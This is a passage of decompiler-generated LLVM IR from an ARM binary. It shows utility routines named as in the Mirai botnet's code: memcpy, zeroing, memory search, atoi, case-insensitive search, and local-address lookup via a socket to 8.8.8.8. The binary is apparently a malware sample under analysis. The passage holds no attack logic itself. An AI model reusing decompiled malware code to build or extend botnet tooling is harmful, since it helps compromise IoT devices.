  %v0_f844.off0 = phi i8 [ %v2_f80c, %dec_label_pc_f830 ], [ %v3_f838, %dec_label_pc_f838 ]
  %v0_f83c = phi i32 [ %v0_f830, %dec_label_pc_f830 ], [ %v0_f83c.pr, %dec_label_pc_f838 ]
  %v1_f83c = add i32 %v0_f83c, -1
  store i32 %v1_f83c, i32* %r3.global-to-local, align 4
  %v3_f840 = icmp eq i32 %v0_f83c, 0
  %v2_f844 = load i32, i32* @r0, align 4
  %v3_f844 = inttoptr i32 %v2_f844 to i8*
  store i8 %v0_f844.off0, i8* %v3_f844, align 1
  %v4_f844 = load i32, i32* @r0, align 4
  %v5_f844 = add i32 %v4_f844, 1
  store i32 %v5_f844, i32* @r0, align 4
  br i1 %v3_f840, label %dec_label_pc_f84c, label %dec_label_pc_f838

dec_label_pc_f84c:                                ; preds = %dec_label_pc_f83c
  %v0_f84c = load i32, i32* %ip.global-to-local, align 4
  ret i32 %v0_f84c

; uselistorder directives
  uselistorder i32 %v0_f83c, { 1, 0 }
  uselistorder i32 %v0_f830, { 1, 0 }
  uselistorder i32 %v1_f820, { 0, 1, 3, 2 }
  uselistorder i32* %r3.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r1.global-to-local, { 2, 1, 0 }
  uselistorder i32* %ip.global-to-local, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_f83c, { 1, 0 }
}

define i32 @util_memcpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %v2_f854 = icmp eq i32 %arg3, 0
  %v0_f858 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_f854, i32 %v0_f858)
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_f860

dec_label_pc_f860:                                ; preds = %dec_label_pc_f860, %entry
  %v0_f860 = phi i32 [ %v1_f868, %dec_label_pc_f860 ], [ 0, %entry ]
  %v2_f860 = add i32 %v0_f860, %arg2
  %v3_f860 = inttoptr i32 %v2_f860 to i8*
  %v4_f860 = load i8, i8* %v3_f860, align 1
  %v4_f864 = add i32 %v0_f860, %arg1
  %v5_f864 = inttoptr i32 %v4_f864 to i8*
  store i8 %v4_f860, i8* %v5_f864, align 1
  %v0_f868 = load i32, i32* %ip.global-to-local, align 4
  %v1_f868 = add i32 %v0_f868, 1
  store i32 %v1_f868, i32* %ip.global-to-local, align 4
  %v9_f86c = icmp eq i32 %v1_f868, %arg3
  br i1 %v9_f86c, label %dec_label_pc_f874, label %dec_label_pc_f860

dec_label_pc_f874:                                ; preds = %dec_label_pc_f860
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_f868, { 1, 2, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @util_zero(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %v2_f878 = icmp eq i32 %arg2, 0
  %v0_f87c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_f878, i32 %v0_f87c)
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_f884

dec_label_pc_f884:                                ; preds = %dec_label_pc_f884, %entry
  %v2_f888 = phi i32 [ %v1_f88c, %dec_label_pc_f884 ], [ 0, %entry ]
  store i32 0, i32* @r3, align 4
  %v4_f888 = add i32 %v2_f888, %arg1
  %v5_f888 = inttoptr i32 %v4_f888 to i8*
  store i8 0, i8* %v5_f888, align 1
  %v0_f88c = load i32, i32* %r2.global-to-local, align 4
  %v1_f88c = add i32 %v0_f88c, 1
  store i32 %v1_f88c, i32* %r2.global-to-local, align 4
  %v9_f890 = icmp eq i32 %v1_f88c, %arg2
  br i1 %v9_f890, label %dec_label_pc_f898, label %dec_label_pc_f884

dec_label_pc_f898:                                ; preds = %dec_label_pc_f884
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_f88c, { 1, 2, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @util_memsearch(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v7_f8b0 = icmp sgt i32 %arg4, %arg2
  br i1 %v7_f8b0, label %dec_label_pc_f8b8, label %dec_label_pc_f8c0

dec_label_pc_f8b8:                                ; preds = %dec_label_pc_f8d4, %dec_label_pc_f8c0, %entry, %dec_label_pc_f900
  %storemerge = phi i32 [ %v1_f900, %dec_label_pc_f900 ], [ -1, %entry ], [ -1, %dec_label_pc_f8c0 ], [ -1, %dec_label_pc_f8d4 ]
  ret i32 %storemerge

dec_label_pc_f8c0:                                ; preds = %entry
  %tmp12 = icmp slt i32 %arg2, 1
  br i1 %tmp12, label %dec_label_pc_f8b8, label %dec_label_pc_f8c8

dec_label_pc_f8c8:                                ; preds = %dec_label_pc_f8c0
  br label %dec_label_pc_f8e0

dec_label_pc_f8d4:                                ; preds = %bb, %dec_label_pc_f8f4
  %v1_f8e03 = phi i32 [ %v1_f8f4, %dec_label_pc_f8f4 ], [ 0, %bb ]
  %v1_f8d4 = add i32 %v0_f900, 1
  %v9_f8d8 = icmp eq i32 %v1_f8d4, %arg2
  br i1 %v9_f8d8, label %dec_label_pc_f8b8, label %dec_label_pc_f8e0

dec_label_pc_f8e0:                                ; preds = %dec_label_pc_f8d4, %dec_label_pc_f8c8
  %v0_f900 = phi i32 [ %v1_f8d4, %dec_label_pc_f8d4 ], [ 0, %dec_label_pc_f8c8 ]
  %v1_f8e0 = phi i32 [ %v1_f8e03, %dec_label_pc_f8d4 ], [ 0, %dec_label_pc_f8c8 ]
  %v2_f8e0 = add i32 %v1_f8e0, %arg3
  %v3_f8e0 = inttoptr i32 %v2_f8e0 to i8*
  %v4_f8e0 = load i8, i8* %v3_f8e0, align 1
  %v2_f8e4 = add i32 %v0_f900, %arg1
  %v3_f8e4 = inttoptr i32 %v2_f8e4 to i8*
  %v4_f8e4 = load i8, i8* %v3_f8e4, align 1
  %v9_f8e8 = icmp eq i8 %v4_f8e4, %v4_f8e0
  br i1 %v9_f8e8, label %dec_label_pc_f8f4, label %bb

bb:                                               ; preds = %dec_label_pc_f8e0
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_f8d4

dec_label_pc_f8f4:                                ; preds = %dec_label_pc_f8e0
  %v1_f8f4 = add i32 %v1_f8e0, 1
  store i32 %v1_f8f4, i32* @ip, align 4
  %v9_f8f8 = icmp eq i32 %v1_f8f4, %arg4
  br i1 %v9_f8f8, label %dec_label_pc_f900, label %dec_label_pc_f8d4

dec_label_pc_f900:                                ; preds = %dec_label_pc_f8f4
  %v1_f900 = add i32 %v0_f900, 1
  br label %dec_label_pc_f8b8

; uselistorder directives
  uselistorder i32 %v1_f8f4, { 1, 2, 0 }
  uselistorder i32 %v1_f8e0, { 1, 0 }
  uselistorder i32 %arg2, { 1, 2, 0 }
  uselistorder label %dec_label_pc_f8d4, { 1, 0 }
  uselistorder label %dec_label_pc_f8b8, { 3, 0, 1, 2 }
}

define i32 @util_atoi(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_f918

dec_label_pc_f918:                                ; preds = %.thread, %dec_label_pc_f92c, %bb, %entry
  %v0_f918 = phi i32 [ %tmp, %entry ], [ %v5_f918, %bb ], [ %v5_f918, %dec_label_pc_f92c ], [ %v5_f918, %.thread ]
  %v1_f918 = inttoptr i32 %v0_f918 to i8*
  %v2_f918 = load i8, i8* %v1_f918, align 1
  %v5_f918 = add i32 %v0_f918, 1
  %v7_f91c = icmp eq i8 %v2_f918, 9
  br i1 %v7_f91c, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_f918
  br label %dec_label_pc_f918

bb:                                               ; preds = %dec_label_pc_f918
  %v8_f920 = icmp eq i8 %v2_f918, 32
  br i1 %v8_f920, label %dec_label_pc_f918, label %dec_label_pc_f92c

dec_label_pc_f92c:                                ; preds = %bb
  %v7_f92c = icmp eq i8 %v2_f918, 10
  br i1 %v7_f92c, label %dec_label_pc_f918, label %dec_label_pc_f934

dec_label_pc_f934:                                ; preds = %dec_label_pc_f92c
  %v7_f934 = icmp eq i8 %v2_f918, 45
  br i1 %v7_f934, label %dec_label_pc_fa24, label %dec_label_pc_f93c

dec_label_pc_f93c:                                ; preds = %dec_label_pc_f934
  %v7_f93c = icmp eq i8 %v2_f918, 43
  br i1 %v7_f93c, label %bb54, label %dec_label_pc_f94c

bb54:                                             ; preds = %dec_label_pc_f93c
  %v2_f940 = inttoptr i32 %v5_f918 to i8*
  %v3_f940 = load i8, i8* %v2_f940, align 1
  %v6_f940 = add i32 %v0_f918, 2
  br label %dec_label_pc_f94c

dec_label_pc_f94c:                                ; preds = %bb54, %dec_label_pc_f93c, %dec_label_pc_fa24
  %v1_f9f439 = phi i32 [ %v5_fa24, %dec_label_pc_fa24 ], [ %v5_f918, %dec_label_pc_f93c ], [ %v6_f940, %bb54 ]
  %v0_f97410.in = phi i8 [ %v2_fa24, %dec_label_pc_fa24 ], [ %v2_f918, %dec_label_pc_f93c ], [ %v3_f940, %bb54 ]
  %storemerge1 = phi i32 [ -2147483648, %dec_label_pc_fa24 ], [ 2147483647, %dec_label_pc_f93c ], [ 2147483647, %bb54 ]
  %v0_fa34 = phi i32 [ 1, %dec_label_pc_fa24 ], [ 0, %dec_label_pc_f93c ], [ 0, %bb54 ]
  %v2_f954 = udiv i32 %storemerge1, %arg2
  %v3_f954 = urem i32 %storemerge1, %arg2
  br label %dec_label_pc_f974.outer

dec_label_pc_f974.outer:                          ; preds = %.thread5, %dec_label_pc_f94c
  %v1_f9f4.ph = phi i32 [ %v6_f9f4, %.thread5 ], [ %v1_f9f439, %dec_label_pc_f94c ]
  %v2_f9f0.ph = phi i32 [ %v5_f9f0, %.thread5 ], [ 0, %dec_label_pc_f94c ]
  %v1_f9b4.ph.in = phi i8 [ %v3_f9f4, %.thread5 ], [ %v0_f97410.in, %dec_label_pc_f94c ]
  %v1_f9cc.ph = phi i32 [ 1, %.thread5 ], [ 0, %dec_label_pc_f94c ]
  %v3_f9c0 = icmp uge i32 %v2_f9f0.ph, %v2_f954
  %v9_f9c0 = icmp eq i32 %v2_f9f0.ph, %v2_f954
  %v2_f9c4 = xor i1 %v3_f9c0, true
  %v3_f9c4 = or i1 %v9_f9c0, %v2_f9c4
  %v2_f9c8 = xor i1 %v9_f9c0, true
  %v3_f9c8 = and i1 %v3_f9c0, %v2_f9c8
  %v2_f9e8 = icmp eq i1 %v9_f9c0, false
  br label %dec_label_pc_f974

dec_label_pc_f974:                                ; preds = %dec_label_pc_f974.outer, %dec_label_pc_f9fc
  %v1_f9f4 = phi i32 [ %v5_f9fc, %dec_label_pc_f9fc ], [ %v1_f9f4.ph, %dec_label_pc_f974.outer ]
  %v1_f9cc = phi i32 [ -1, %dec_label_pc_f9fc ], [ %v1_f9cc.ph, %dec_label_pc_f974.outer ]
  %v1_f9b4.in = phi i8 [ %v2_f9fc, %dec_label_pc_f9fc ], [ %v1_f9b4.ph.in, %dec_label_pc_f974.outer ]
  %v1_f9b4 = zext i8 %v1_f9b4.in to i32
  %v1_f974 = urem i32 %v1_f9b4, 256
  %v1_f978 = add nsw i32 %v1_f974, -48
  %v1_f980 = add nsw i32 %v1_f974, -97
  %v1_f984 = add nsw i32 %v1_f9b4, -48
  %v1_f988 = add nsw i32 %v1_f974, -65
  %tmp87 = icmp ult i32 %v1_f978, 10
  br i1 %tmp87, label %dec_label_pc_f9b8, label %dec_label_pc_f990

dec_label_pc_f990:                                ; preds = %dec_label_pc_f974
  %v2_f990 = icmp ugt i32 %v1_f988, 24
  %v7_f990 = icmp eq i32 %v1_f988, 25
  %v2_f994 = xor i1 %v7_f990, true
  %v3_f994 = and i1 %v2_f990, %v2_f994
  br i1 %v3_f994, label %bb55, label %bb56

bb55:                                             ; preds = %dec_label_pc_f990
  br label %bb56

bb56:                                             ; preds = %dec_label_pc_f990, %bb55
  %v0_f9a815 = phi i32 [ %v1_f984, %dec_label_pc_f990 ], [ 0, %bb55 ]
  %v2_f998 = xor i1 %v2_f990, true
  %v3_f998 = or i1 %v7_f990, %v2_f998
  br i1 %v3_f998, label %bb57, label %bb58

bb57:                                             ; preds = %bb56
  br label %bb58

bb58:                                             ; preds = %bb56, %bb57
  %v0_f9a8 = phi i32 [ %v0_f9a815, %bb56 ], [ 1, %bb57 ]
  br i1 %v3_f994, label %bb59, label %bb60

bb59:                                             ; preds = %bb58
  %v6_f9a0 = icmp ugt i32 %v1_f980, 24
  %v11_f9a0 = icmp eq i32 %v1_f980, 25
  br label %bb60

bb60:                                             ; preds = %bb58, %bb59
  %v1_f9a4 = phi i1 [ %v7_f990, %bb58 ], [ %v11_f9a0, %bb59 ]
  %v0_f9a4 = phi i1 [ %v2_f990, %bb58 ], [ %v6_f9a0, %bb59 ]
  %v2_f9a4 = xor i1 %v1_f9a4, true
  %v3_f9a4 = and i1 %v0_f9a4, %v2_f9a4
  br i1 %v3_f9a4, label %dec_label_pc_fa08, label %dec_label_pc_f9a8

dec_label_pc_f9a8:                                ; preds = %bb60
  %v2_f9a8 = icmp eq i32 %v0_f9a8, 0
  %. = select i1 %v2_f9a8, i32 87, i32 55
  %v2_f9b4 = sub nsw i32 %v1_f9b4, %.
  br label %dec_label_pc_f9b8

dec_label_pc_f9b8:                                ; preds = %dec_label_pc_f974, %dec_label_pc_f9a8
  %v0_f9cc33 = phi i32 [ %v1_f988, %dec_label_pc_f974 ], [ %., %dec_label_pc_f9a8 ]
  %v3_f9f0 = phi i32 [ %v1_f984, %dec_label_pc_f974 ], [ %v2_f9b4, %dec_label_pc_f9a8 ]
  %v2_f9b8 = sub i32 %v3_f9f0, %arg2
  %v4_f9b8 = xor i32 %v3_f9f0, %arg2
  %v5_f9b8 = xor i32 %v2_f9b8, %v3_f9f0
  %v6_f9b8 = and i32 %v5_f9b8, %v4_f9b8
  %v7_f9b8 = icmp slt i32 %v6_f9b8, 0
  %v8_f9b8 = icmp slt i32 %v2_f9b8, 0
  %v2_f9bc = xor i1 %v8_f9b8, %v7_f9b8
  br i1 %v2_f9bc, label %dec_label_pc_f9c0, label %dec_label_pc_fa08

dec_label_pc_f9c0:                                ; preds = %dec_label_pc_f9b8
  br i1 %v3_f9c4, label %bb63, label %bb64

bb63:                                             ; preds = %dec_label_pc_f9c0
  br label %bb64

bb64:                                             ; preds = %dec_label_pc_f9c0, %bb63
  %v0_f9cc32 = phi i32 [ %v0_f9cc33, %dec_label_pc_f9c0 ], [ 0, %bb63 ]
  br i1 %v3_f9c8, label %bb65, label %bb66

bb65:                                             ; preds = %bb64
  br label %bb66

bb66:                                             ; preds = %bb64, %bb65
  %v0_f9cc = phi i32 [ %v0_f9cc32, %bb64 ], [ 1, %bb65 ]
  %tmp88 = icmp slt i32 %v1_f9cc, 0
  %v4_f9cc = zext i1 %tmp88 to i32
  %v5_f9cc = or i32 %v0_f9cc, %v4_f9cc
  %v7_f9cc = icmp eq i32 %v5_f9cc, 0
  br i1 %v7_f9cc, label %dec_label_pc_f9d4, label %dec_label_pc_f9fc

dec_label_pc_f9d4:                                ; preds = %bb66
  %v2_f9e0 = sub i32 %v3_f9f0, %v3_f954
  %v4_f9e0 = xor i32 %v3_f9f0, %v3_f954
  %v5_f9e0 = xor i32 %v2_f9e0, %v3_f9f0
  %v6_f9e0 = and i32 %v5_f9e0, %v4_f9e0
  %v7_f9e0 = icmp slt i32 %v6_f9e0, 0
  %v8_f9e0 = icmp slt i32 %v2_f9e0, 0
  %v9_f9e0 = icmp eq i32 %v3_f9f0, %v3_f954
  %v3_f9e4 = xor i1 %v8_f9e0, %v7_f9e0
  %v4_f9e4 = or i1 %v9_f9e0, %v3_f9e4
  br i1 %v4_f9e4, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %dec_label_pc_f9d4
  br label %.thread5

thread-pre-split:                                 ; preds = %dec_label_pc_f9d4
  br i1 %v2_f9e8, label %.thread5, label %dec_label_pc_f9fc

.thread5:                                         ; preds = %thread-pre-split, %thread-pre-split.thread
  %v4_f9f0 = mul i32 %v2_f9f0.ph, %arg2
  %v5_f9f0 = add i32 %v3_f9f0, %v4_f9f0
  %v2_f9f4 = inttoptr i32 %v1_f9f4 to i8*
  %v3_f9f4 = load i8, i8* %v2_f9f4, align 1
  %v6_f9f4 = add i32 %v1_f9f4, 1
  br label %dec_label_pc_f974.outer

dec_label_pc_f9fc:                                ; preds = %thread-pre-split, %bb66
  %v1_f9fc = inttoptr i32 %v1_f9f4 to i8*
  %v2_f9fc = load i8, i8* %v1_f9fc, align 1
  %v5_f9fc = add i32 %v1_f9f4, 1
  br label %dec_label_pc_f974

dec_label_pc_fa08:                                ; preds = %dec_label_pc_f9b8, %bb60
  %v1_fa08 = icmp slt i32 %v1_f9cc, 0
  %v2_fa34 = icmp eq i32 %v0_fa34, 0
  br i1 %v1_fa08, label %dec_label_pc_fa34, label %dec_label_pc_fa10

dec_label_pc_fa10:                                ; preds = %dec_label_pc_fa08
  br i1 %v2_fa34, label %bb70, label %bb69

bb69:                                             ; preds = %dec_label_pc_fa10
  %v2_fa14 = sub i32 0, %v2_f9f0.ph
  br label %bb70

bb70:                                             ; preds = %.thread43, %bb71, %dec_label_pc_fa10, %bb69
  %v1_fa20 = phi i32 [ -2147483648, %bb71 ], [ %v2_f9f0.ph, %dec_label_pc_fa10 ], [ %v2_fa14, %bb69 ], [ 2147483647, %.thread43 ]
  ret i32 %v1_fa20

dec_label_pc_fa24:                                ; preds = %dec_label_pc_f934
  %v1_fa24 = inttoptr i32 %v5_f918 to i8*
  %v2_fa24 = load i8, i8* %v1_fa24, align 1
  %v5_fa24 = add i32 %v0_f918, 2
  br label %dec_label_pc_f94c

dec_label_pc_fa34:                                ; preds = %dec_label_pc_fa08
  br i1 %v2_fa34, label %.thread43, label %bb71

.thread43:                                        ; preds = %dec_label_pc_fa34
  br label %bb70

bb71:                                             ; preds = %dec_label_pc_fa34
  br label %bb70

; uselistorder directives
  uselistorder i1 %v2_fa34, { 1, 0 }
  uselistorder i32 %v2_f9e0, { 1, 0 }
  uselistorder i32 %v2_f9b8, { 1, 0 }
  uselistorder i32 %v3_f9f0, { 0, 6, 1, 2, 5, 3, 4, 7 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i1 %v7_f990, { 1, 2, 0 }
  uselistorder i1 %v2_f990, { 1, 0, 2 }
  uselistorder i32 %v1_f974, { 1, 2, 0 }
  uselistorder i32 %v1_f9b4, { 1, 0, 2 }
  uselistorder i32 %v1_f9cc, { 1, 0 }
  uselistorder i32 %v1_f9f4, { 2, 3, 1, 0 }
  uselistorder i1 %v9_f9c0, { 1, 0, 2 }
  uselistorder i1 %v3_f9c0, { 1, 0 }
  uselistorder i32 %v2_f9f0.ph, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v3_f954, { 1, 0, 2 }
  uselistorder i32 %v2_f954, { 1, 0 }
  uselistorder i32 %v5_f918, { 4, 3, 5, 2, 1, 0 }
  uselistorder i32 %v0_f918, { 0, 1, 3, 2 }
  uselistorder i32 55, { 0, 2, 1 }
  uselistorder i32 25, { 8, 9, 0, 5, 1, 6, 2, 7, 4, 3 }
  uselistorder i8 32, { 1, 2, 0 }
  uselistorder i8 9, { 1, 0 }
  uselistorder label %bb70, { 1, 0, 3, 2 }
  uselistorder label %bb66, { 1, 0 }
  uselistorder label %bb64, { 1, 0 }
  uselistorder label %dec_label_pc_f9b8, { 1, 0 }
  uselistorder label %bb60, { 1, 0 }
  uselistorder label %bb58, { 1, 0 }
  uselistorder label %bb56, { 1, 0 }
  uselistorder label %dec_label_pc_f974, { 1, 0 }
  uselistorder label %dec_label_pc_f94c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f918, { 1, 2, 0, 3 }
}

define i32 @util_local_addr() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_fa44 = load i32, i32* @r4, align 4
  %v6_fa44 = load i32, i32* @r5, align 4
  %v9_fa44 = load i32, i32* @r6, align 4
  store i32 16, i32* @r6, align 4
  store i32 16, i32* %stack_var_-20, align 4
  %v0_fa54 = call i32 @__GI___errno_location()
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_fa5c = inttoptr i32 %v0_fa54 to i32*
  store i32 0, i32* %v2_fa5c, align 4
  %v0_fa68 = load i32, i32* %r4.global-to-local, align 4
  %v3_fa6c = call i32 @socket(i32 2, i32 2, i32 %v0_fa68)
  %v7_fa70 = icmp eq i32 %v3_fa6c, -1
  store i32 %v3_fa6c, i32* @r5, align 4
  br i1 %v7_fa70, label %bb, label %dec_label_pc_fa80

bb:                                               ; preds = %entry
  %v1_fa78 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_facc

dec_label_pc_fa80:                                ; preds = %entry
  %v2_fa8c = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_fa8c, i32* @r4, align 4
  %v0_fa98 = load i32, i32* @r6, align 4
  store i32 2, i32* %stack_var_-36, align 4
  %v3_faac = call i32 @__libc_connect(i32 %v3_fa6c, i32 %v2_fa8c, i32 %v0_fa98)
  store i32 %v2_fa8c, i32* @r1, align 4
  %v2_fab4 = ptrtoint i32* %stack_var_-20 to i32
  %v0_fab8 = load i32, i32* @r5, align 4
  %v3_fabc = call i32 @__GI_getsockname(i32 %v0_fab8, i32 %v2_fa8c, i32 %v2_fab4)
  %v0_fac0 = load i32, i32* @r5, align 4
  %v1_fac4 = call i32 @__GI___libc_close(i32 %v0_fac0)
  br label %dec_label_pc_facc

dec_label_pc_facc:                                ; preds = %bb, %dec_label_pc_fa80
  %storemerge = phi i32 [ 134744072, %dec_label_pc_fa80 ], [ %v1_fa78, %bb ]
  store i32 %v3_fa44, i32* @r4, align 4
  store i32 %v6_fa44, i32* @r5, align 4
  store i32 %v9_fa44, i32* @r6, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_fa8c, { 1, 0, 2, 3 }
  uselistorder i32 %v3_fa6c, { 1, 2, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32 134744072, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 6, 7, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @socket, { 15, 16, 13, 14, 12, 11, 10, 9, 8, 0, 7, 6, 3, 2, 1, 5, 4 }
  uselistorder i32 ()* @__GI___errno_location, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_facc, { 1, 0 }
}

define i32 @util_stristr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp23 = ptrtoint i8* %arg1 to i32
  %v3_fadc = load i8, i8* %tmp, align 1
  %v2_fae0 = icmp eq i8 %v3_fadc, 0
  br i1 %v2_fae0, label %bb, label %dec_label_pc_faf4

bb:                                               ; preds = %entry
  %v4_fadc = zext i8 %v3_fadc to i32
  br label %dec_label_pc_fb08

dec_label_pc_faf4:                                ; preds = %entry
  br label %dec_label_pc_faf8

dec_label_pc_faf8:                                ; preds = %dec_label_pc_faf8, %dec_label_pc_faf4
  %v0_faf8 = phi i32 [ %v1_faf8, %dec_label_pc_faf8 ], [ 0, %dec_label_pc_faf4 ]
  %v1_faf8 = add i32 %v0_faf8, 1
  %v2_fafc = add i32 %v1_faf8, %arg2
  %v3_fafc = inttoptr i32 %v2_fafc to i8*
  %v4_fafc = load i8, i8* %v3_fafc, align 1
  %v2_fb00 = icmp eq i8 %v4_fafc, 0
  br i1 %v2_fb00, label %dec_label_pc_fb08, label %dec_label_pc_faf8

dec_label_pc_fb08:                                ; preds = %dec_label_pc_faf8, %bb
  %v0_fb4c21 = phi i32 [ %v4_fadc, %bb ], [ %v1_faf8, %dec_label_pc_faf8 ]
  %v0_fb102 = load i32, i32* @r1, align 4
  %tmp29 = icmp slt i32 %v0_fb102, 1
  br i1 %tmp29, label %dec_label_pc_fb60, label %dec_label_pc_fb1c

dec_label_pc_fb1c:                                ; preds = %dec_label_pc_fb08, %dec_label_pc_fb10.backedge
  %v0_fb14.in = phi i32 [ %v0_fb14, %dec_label_pc_fb10.backedge ], [ %v0_fb102, %dec_label_pc_fb08 ]
  %v1_fb28 = phi i32 [ %v1_fb2815, %dec_label_pc_fb10.backedge ], [ 0, %dec_label_pc_fb08 ]
  %v0_fb1c = phi i32 [ %v5_fb1c, %dec_label_pc_fb10.backedge ], [ %tmp23, %dec_label_pc_fb08 ]
  %v0_fb14 = add i32 %v0_fb14.in, -1
  %v1_fb1c = inttoptr i32 %v0_fb1c to i8*
  %v2_fb1c = load i8, i8* %v1_fb1c, align 1
  %v3_fb1c = zext i8 %v2_fb1c to i32
  %v5_fb1c = add i32 %v0_fb1c, 1
  %v1_fb20 = add nsw i32 %v3_fb1c, -65
  %v2_fb28 = add i32 %v1_fb28, %arg2
  %v3_fb28 = inttoptr i32 %v2_fb28 to i8*
  %v4_fb28 = load i8, i8* %v3_fb28, align 1
  %v6_fb28 = zext i8 %v4_fb28 to i32
  %v1_fb2c = add nsw i32 %v6_fb28, -65
  %tmp38 = icmp ult i32 %v1_fb20, 26
  br i1 %tmp38, label %bb30, label %bb31

bb30:                                             ; preds = %dec_label_pc_fb1c
  %v5_fb30 = or i32 %v3_fb1c, 96
  br label %bb31

bb31:                                             ; preds = %dec_label_pc_fb1c, %bb30
  %v0_fb3c = phi i32 [ %v3_fb1c, %dec_label_pc_fb1c ], [ %v5_fb30, %bb30 ]
  %tmp39 = icmp ult i32 %v1_fb2c, 26
  br i1 %tmp39, label %bb32, label %bb33

bb32:                                             ; preds = %bb31
  %v5_fb38 = or i32 %v6_fb28, 96
  br label %bb33

bb33:                                             ; preds = %bb31, %bb32
  %v1_fb3c = phi i32 [ %v6_fb28, %bb31 ], [ %v5_fb38, %bb32 ]
  %v9_fb3c = icmp eq i32 %v0_fb3c, %v1_fb3c
  br i1 %v9_fb3c, label %dec_label_pc_fb48, label %bb34

bb34:                                             ; preds = %bb33
  br label %dec_label_pc_fb10.backedge

dec_label_pc_fb10.backedge:                       ; preds = %bb34, %dec_label_pc_fb48
  %v1_fb2815 = phi i32 [ 0, %bb34 ], [ %v1_fb48, %dec_label_pc_fb48 ]
  %tmp35 = icmp slt i32 %v0_fb14, 1
  br i1 %tmp35, label %dec_label_pc_fb60, label %dec_label_pc_fb1c

dec_label_pc_fb48:                                ; preds = %bb33
  %v1_fb48 = add i32 %v1_fb28, 1
  %v9_fb4c = icmp eq i32 %v0_fb4c21, %v1_fb48
  br i1 %v9_fb4c, label %dec_label_pc_fb54, label %dec_label_pc_fb10.backedge

dec_label_pc_fb54:                                ; preds = %dec_label_pc_fb48
  %v2_fb54 = sub i32 %v5_fb1c, %tmp23
  br label %dec_label_pc_fb60

dec_label_pc_fb60:                                ; preds = %dec_label_pc_fb10.backedge, %dec_label_pc_fb08, %dec_label_pc_fb54
  %storemerge = phi i32 [ %v2_fb54, %dec_label_pc_fb54 ], [ -1, %dec_label_pc_fb08 ], [ -1, %dec_label_pc_fb10.backedge ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_fb48, { 1, 0 }
  uselistorder i32 %v0_fb1c, { 1, 0 }
  uselistorder i32 %v1_fb28, { 1, 0 }
  uselistorder i8 %v3_fadc, { 1, 0 }
  uselistorder i32 %tmp23, { 1, 0 }
  uselistorder i32 26, { 0, 1, 2, 5, 3, 6, 4, 7, 8 }
  uselistorder label %dec_label_pc_fb60, { 2, 0, 1 }
  uselistorder label %dec_label_pc_fb10.backedge, { 1, 0 }
  uselistorder label %bb33, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_fb1c, { 1, 0 }
}

define i32 @__udivsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_fb68 = load i32, i32* @r1, align 4
  %v1_fb68 = add i32 %v0_fb68, -1
  store i32 %v1_fb68, i32* %r2.global-to-local, align 4
  %v2_fb68 = icmp eq i32 %v0_fb68, 0
  %v7_fb68 = icmp eq i32 %v0_fb68, 1
  %v0_fb6c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_fb68, i32 %v0_fb6c)
  br i1 %v2_fb68, label %dec_label_pc_fc50, label %dec_label_pc_fb74

dec_label_pc_fb74:                                ; preds = %entry
  %v0_fb74 = load i32, i32* %r0.global-to-local, align 4
  %v1_fb74 = load i32, i32* @r1, align 4
  %tmp = icmp ugt i32 %v0_fb74, %v1_fb74
  br i1 %tmp, label %dec_label_pc_fb7c, label %dec_label_pc_fc08

dec_label_pc_fb7c:                                ; preds = %dec_label_pc_fb74
  %v1_fb7c = load i32, i32* %r2.global-to-local, align 4
  %v2_fb7c = and i32 %v1_fb7c, %v1_fb74
  %v4_fb7c = icmp eq i32 %v2_fb7c, 0
  br i1 %v4_fb7c, label %dec_label_pc_fc14, label %dec_label_pc_fb84

dec_label_pc_fb84:                                ; preds = %dec_label_pc_fb7c
  %v3_fb84 = icmp ult i32 %v1_fb74, 536870912
  br i1 %v3_fb84, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_fb84
  %v4_fb88 = mul i32 %v1_fb74, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_fb84, %.thread
